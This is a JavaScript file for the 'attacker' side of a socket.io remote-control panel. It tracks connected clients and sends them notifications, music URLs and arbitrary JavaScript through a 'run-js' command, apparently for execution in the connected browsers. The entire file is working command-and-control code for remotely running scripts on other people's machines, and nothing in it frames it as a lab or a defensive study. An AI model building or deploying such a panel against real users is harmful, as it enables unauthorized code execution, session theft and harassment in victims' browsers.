var socket = io();
socket.emit('role', 'attacker');

const logBox = document.querySelector('#log');
const log = (msg) => {
  const p = document.createElement('li');
  p.textContent = msg;
  logBox.appendChild(p);
};

socket.on('connect', () => {
  document.querySelector("#status").textContent = `Connected`;
  log('Connected');
});

socket.on('disconnect', () => {
  document.querySelector("#status").textContent = `Disconnected`;
  log('Disconnected');
});

socket.on('connections', (connections) => {
  document.querySelector("#status").textContent = `Connections: ${connections}`;
  log(`Connections: ${connections}`);
});


document.querySelector("#ping").addEventListener('click', () => {
  socket.emit('ping');
  log('Sent ping');
});
socket.on('pong', () => {
  log('Received pong');
});

const notificationText = document.querySelector("#notification-text");
document.querySelector("#notification-btn").addEventListener('click', () => {
  socket.emit('notification', notificationText.value);
  log(`Sent notification: ${notificationText.value}`);
});

const musicUrl = document.querySelector("#music-url");
document.querySelector("#music-btn").addEventListener('click', () => {
  socket.emit('music', musicUrl.value);
  log(`Sent music: ${musicUrl.value}`);
});
document.querySelector("#stop-music-btn").addEventListener('click', () => {
  socket.emit('stop-music');
  log(`Stopped music`);
});

const javascriptCode = document.querySelector("#javascript");
document.querySelector("#run-js-btn").addEventListener('click', () => {
  socket.emit('run-js', javascriptCode.value);
  log(`Sent javascript: ${javascriptCode.value}`)
});
